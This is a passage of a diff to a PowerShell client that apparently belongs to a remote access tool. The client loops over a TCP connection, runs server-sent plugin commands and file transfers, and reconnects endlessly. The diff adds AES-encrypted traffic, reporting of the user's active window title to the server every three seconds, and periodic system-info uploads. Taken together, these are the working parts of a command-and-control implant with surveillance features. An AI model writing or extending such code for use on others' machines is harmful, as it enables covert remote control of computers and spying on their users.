             Write-Host "$(Get-Date -Format 'HH:mm:ss') - No auth response" -ForegroundColor Red
             throw "Auth failed"
@@ -986,17 +883,37 @@ while ($true) {
         $lastHeartbeat = [DateTime]::UtcNow
         $lastInfoRefresh = [DateTime]::UtcNow
         $lastCleanup = [DateTime]::UtcNow
+        $lastActiveWindow = [DateTime]::UtcNow
         $infoRefreshSeconds = 60
         $cleanupIntervalSeconds = 10
+        $activeWindowSeconds = 3
+        $originalReceiveTimeout = $tcpClient.ReceiveTimeout
 
         while ($tcpClient.Connected) {
             $now = [DateTime]::UtcNow
 
-            # ---- PHASE 1: Read all incoming messages ----
-            while ($stream.DataAvailable) {
-                $msg = Read-TcpMessage -Stream $stream
-                if ($null -eq $msg) { throw "Connection lost" }
+            # ---- Try to read a message with 200ms timeout ----
+            $msg = $null
+            try {
+                $tcpClient.ReceiveTimeout = 200
+                if ($stream.DataAvailable) {
+                    $msg = Read-EncryptedMessage -Stream $stream -AesKey $aesKey
+                }
+            } catch {
+                # timeout - continue to heartbeat/plugin checks
+            }
 
+            if ($null -eq $msg) {
+                # If data was available but read failed, connection may be lost
+                try {
+                    if ($stream.DataAvailable) {
+                        $msg = Read-EncryptedMessage -Stream $stream -AesKey $aesKey
+                        if ($null -eq $msg) { throw "Connection lost" }
+                    }
+                } catch { throw "Connection lost" }
+            }
+
+            if ($msg) {
                 switch ($msg.Type) {
                     $MSG_HEARTBEAT_ACK {
                         if ($msg.Payload -and $msg.Payload.Length -ge 5) {
@@ -1009,71 +926,90 @@ while ($true) {
                         }
                     }
                     $MSG_PLUGIN_CMD { Handle-PluginCmd -Payload $msg.Payload }
-                    $MSG_FILE_TRANSFER { Handle-FileTransfer -Payload $msg.Payload }
+                    $MSG_FILE_TRANSFER { Handle-FileTransfer -Payload $msg.Payload -AesKey $aesKey }
                     $MSG_DISCONNECT { throw "Server disconnect" }
                     default {
                         Write-Host "$(Get-Date -Format 'HH:mm:ss') - Unknown msg: 0x$($msg.Type.ToString('X2'))" -ForegroundColor Yellow
                     }
                 }
+                # Process more messages immediately
+                continue
             }
 
-            # ---- PHASE 2: Send ALL plugin output (tight loop until drained) ----
+            # ---- Drain any remaining buffered messages ----
+            $drained = $false
+            while (-not $drained) {
+                $drained = $true
+                while ($stream.DataAvailable) {
+                    $msg = Read-EncryptedMessage -Stream $stream -AesKey $aesKey
+                    if ($null -eq $msg) { throw "Connection lost" }
+                    switch ($msg.Type) {
+                        $MSG_HEARTBEAT_ACK { }
+                        $MSG_PLUGIN_CMD { Handle-PluginCmd -Payload $msg.Payload }
+                        $MSG_FILE_TRANSFER { Handle-FileTransfer -Payload $msg.Payload -AesKey $aesKey }
+                        $MSG_DISCONNECT { throw "Server disconnect" }
+                        default { }
+                    }
+                    $drained = $false
+                }
+            }
+
+            # ---- Send ALL plugin output ----
             $outputDrained = $false
             while (-not $outputDrained) {
-                $sentAny = Send-AllPluginOutput -Stream $stream
-                if (-not $sentAny) {
-                    $outputDrained = $true
-                }
-                # Check for new incoming while sending output
+                $sentAny = Send-AllPluginOutput -Stream $stream -AesKey $aesKey
+                if (-not $sentAny) { $outputDrained = $true }
                 if ($stream.DataAvailable) { break }
             }
 
-            # If new data arrived during output send, loop back immediately
             if ($stream.DataAvailable) { continue }
 
-            # ---- PHASE 3: Heartbeat ----
+            # ---- Heartbeat ----
             if (($now - $lastHeartbeat).TotalSeconds -ge $heartbeatInterval) {
-                Write-TcpMessage -Stream $stream -MsgType $MSG_HEARTBEAT -Payload ([byte[]]@(0))
+                Write-EncryptedMessage -Stream $stream -MsgType $MSG_HEARTBEAT -Payload ([byte[]]@(0)) -AesKey $aesKey
                 $lastHeartbeat = $now
             }
 
-            # ---- PHASE 4: System info refresh (time-based, non-blocking) ----
+            # ---- Active window reporting ----
+            if (($now - $lastActiveWindow).TotalSeconds -ge $activeWindowSeconds) {
+                $lastActiveWindow = $now
+                try {
+                    $title = Get-ActiveWindowTitle
+                    if (-not [string]::IsNullOrEmpty($title)) {
+                        $titleBytes = [Text.Encoding]::UTF8.GetBytes($title)
+                        Write-EncryptedMessage -Stream $stream -MsgType $MSG_ACTIVE_WINDOW -Payload $titleBytes -AesKey $aesKey
+                    }
+                } catch { }
+            }
+
+            # ---- System info refresh ----
             if (($now - $lastInfoRefresh).TotalSeconds -ge $infoRefreshSeconds) {
                 $lastInfoRefresh = $now
                 $systemInfo = Get-SystemInfo
                 $infoBytes = [Text.Encoding]::UTF8.GetBytes($systemInfo)
-                Write-TcpMessage -Stream $stream -MsgType $MSG_CLIENT_INFO -Payload $infoBytes
+                Write-EncryptedMessage -Stream $stream -MsgType $MSG_CLIENT_INFO -Payload $infoBytes -AesKey $aesKey
             }
 
-            # ---- PHASE 5: Dead plugin cleanup ----
+            # ---- Dead plugin cleanup ----
             if (($now - $lastCleanup).TotalSeconds -ge $cleanupIntervalSeconds) {
                 $lastCleanup = $now
                 Cleanup-DeadPlugins
-            }
-
-            # ---- PHASE 6: Smart wait ----
-            # Tight poll: check every 1ms for data or plugin output, max 20ms
-            $waitUntil = [DateTime]::UtcNow.AddMilliseconds(20)
-            while ([DateTime]::UtcNow -lt $waitUntil) {
-                if ($stream.DataAvailable) { break }
-                if (Get-HasPluginOutput) { break }
-                [System.Threading.Thread]::Sleep(1)
             }
         }
     }
     catch {
         $errMsg = $_.Exception.Message
-        if ($errMsg -ne "Auth failed" -and $errMsg -ne "Connection lost" -and $errMsg -ne "Server disconnect") {
+        if ($errMsg -ne "Auth failed" -and $errMsg -ne "Connection lost" -and $errMsg -ne "Server disconnect" -and $errMsg -ne "Key exchange failed") {
             Write-Host "$(Get-Date -Format 'HH:mm:ss') - Error: $errMsg" -ForegroundColor Red
         }
     }
     finally {
         if ($null -ne $stream) { try { $stream.Dispose() } catch { } }
         if ($null -ne $tcpClient) { try { $tcpClient.Close() } catch { } }
-    }
 
-    Write-Host "$(Get-Date -Format 'HH:mm:ss') - Reconnecting in 5s..." -ForegroundColor Yellow
-    Start-Sleep -Seconds 5
+        Write-Host "$(Get-Date -Format 'HH:mm:ss') - Reconnecting in 5s..." -ForegroundColor Yellow
+        Start-Sleep -Seconds 5
+    }
 }
 }
 finally {
